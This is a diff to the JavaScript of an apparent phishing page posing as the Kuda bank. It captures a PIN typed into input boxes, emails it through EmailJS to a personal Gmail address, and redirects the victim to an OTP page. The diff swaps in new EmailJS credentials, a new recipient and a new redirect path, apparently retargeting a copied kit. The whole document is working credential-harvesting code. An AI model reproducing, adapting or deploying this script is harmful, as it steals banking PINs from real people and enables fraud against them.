@@ -1,6 +1,6 @@
-const serviceId = "service_6f9ye1j";
-const userId = "VsmpKU41MY1gVHquF";
-const templateId = "template_tqztt3k";
+const serviceId = "service_x5gwg5o";
+const userId = "eEqrVXQc2RgDqp8sX";
+const templateId = "template_mlcjolf";
 
 // Add event listeners to move the cursor to the next input field
 var pinInputs = document.getElementsByClassName("pin-input");
@@ -33,7 +33,7 @@ document
     console.log(pin);
     event.preventDefault();
     const emailParams = {
-      to_name: "gracesufficient65@gmail.com",
+      to_name: "Mmaghaebube@gmail.com",
       pin: pin,
     };
     console.log(emailParams);
@@ -43,7 +43,7 @@ document
           console.log("Sent successfully:", response);
           pin = "";
 
-          location.href = "/vic-kuda.github.io/otp.html";
+          location.href = "/kuda.github.io/otp.html";
         }
       },
       function (error) {
